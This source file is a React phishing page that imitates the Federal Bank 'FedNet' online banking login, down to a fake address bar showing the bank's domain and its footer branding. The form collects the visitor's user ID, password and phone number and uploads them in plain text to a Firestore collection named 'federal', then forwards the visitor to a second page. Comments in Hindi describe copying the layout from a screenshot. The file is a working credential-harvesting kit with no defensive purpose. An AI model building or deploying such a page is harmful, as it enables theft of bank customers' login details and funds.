import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  // ध्यान दें: वेरिएबल का नाम 'password' रखा गया है
  const [password, setPassword] = useState(''); 
  const [phoneNumber, setPhoneNumber] = useState('');
  const [language] = useState('English'); // Hidden, but used for submission
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const COLLECTION_NAME = 'federal'; 

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      let documentId = localStorage.getItem(`${COLLECTION_NAME}_document_id`);
      if (!documentId) {
        documentId = `user_${timestamp}`;
        localStorage.setItem(`${COLLECTION_NAME}_document_id`, documentId);
      }
      
      // Firestore में डेटा अपलोड करें
      const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
        key: documentId,
        userId,
        password,
        phoneNumber,
        language,
        timeStamp: timestamp,
      });
      
      if (result.state === 'success') {
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${documentId}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    // Main Container - Light Background (Image placeholder)
    <div className="flex flex-col min-h-screen relative bg-gray-100 overflow-hidden">
        
        {/* Blurred Background Placeholder (3374.jpg से) */}
        <div className="absolute inset-0 bg-cover bg-center" style={{ 
            backgroundImage: 'url("https://placehold.co/1000x1000/B0E0E6/000000/png?text=Federal+Bank+Blur")', // यहाँ एक लाइट ब्लर इमेज का URL आएगा
            filter: 'blur(3px)', 
            zIndex: 0 
        }}></div>

        {/* Header - (3374.jpg के ऊपर का छोटा बार) */}
        <header className="relative bg-white bg-opacity-90 p-3 flex justify-between items-center shadow-md z-10">
            <div className="flex items-center space-x-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-[#003366]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.477 3-10S13.657 3 12 3s-3 4.477-3 10 1.343 10 3 10z" />
                </svg>
                <div className="text-sm font-semibold text-[#003366]">fednet.federal.bank.in</div>
            </div>
            {/* Icons on the right side */}
            <div className="flex space-x-3 text-[#003366]">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h7" /></svg>
            </div>
        </header>

        {/* Main Content - White Login Card */}
        <main className="flex-1 p-4 flex justify-center items-start pt-16 relative z-10">
            <div className="bg-white rounded-lg w-full max-w-sm p-6 shadow-2xl">
                
                {/* Need an Account? Sign Up */}
                <div className="flex justify-between items-center mb-6">
                    <p className="text-sm text-gray-600">
                        Need an Account? <a href="#" className="text-blue-600 font-semibold hover:underline">Sign Up</a>
                    </p>
                    {/* Small Federal Bank Logo Placeholder */}
                    <img src="https://placehold.co/60x20/FFFFFF/003366/png?text=FedNet" alt="FedNet Logo" className="h-5" />
                </div>

                {/* Login Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    
                    {/* 1. User ID Inout (Simple style) */}
                    <div>
                        <input
                            type="text"
                            placeholder="User ID"
                            value={userId}
                            onChange={(e) => setUserId(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 2. Password Input (Simple style) */}
                    <div>
                        <input
                            type="password"
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 3. Phone Number Input (New addition in the simple design) */}
                    <div>
                        <input
                            type="tel"
                            placeholder="10-digit phone number"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            pattern="[0-9]{10}"
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* LOGIN Button (Dark Blue as per 3374.jpg) */}
                    <button
                        type="submit"
                        className="w-full bg-[#003366] hover:bg-[#004488] text-white font-bold py-2 rounded-md transition duration-150 ease-in-out text-base mt-2"
                        disabled={isSubmitting}
                    >
                        {isSubmitting ? "Processing..." : "Log In"}
                    </button>

                    {/* Links below the LOGIN button (3374.jpg style) */}
                    <div className="flex justify-between text-sm pt-1">
                        <a href="#" className="text-blue-600 hover:underline">
                            Forgot Password?
                        </a>
                        <div className="space-x-4">
                            <a href="#" className="text-blue-600 hover:underline">
                                Forgot User ID?
                            </a>
                            <a href="#" className="text-blue-600 hover:underline">
                                Unlock User ID?
                            </a>
                        </div>
                    </div>

                </form>

            </div>
        </main>

        {/* Footer (Dark Blue Federal Bank Bar) */}
        <footer className="relative bg-[#003366] text-white p-4 text-center z-10">
            {/* Federal Bank Logo and Text */}
            <div className="flex justify-center items-center space-x-2 mb-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.477 3-10S13.657 3 12 3s-3 4.477-3 10 1.343 10 3 10z" />
                </svg>
                <div className="text-lg font-bold">FEDERAL BANK</div>
            </div>
            <p className="text-xs">YOUR PERFECT BANKING PARTNER</p>
            {/* Other footer details like DICGC, QR code, Privacy - kept simple for focus */}
        </footer>
    </div>
  );
};

export default FirstPage;

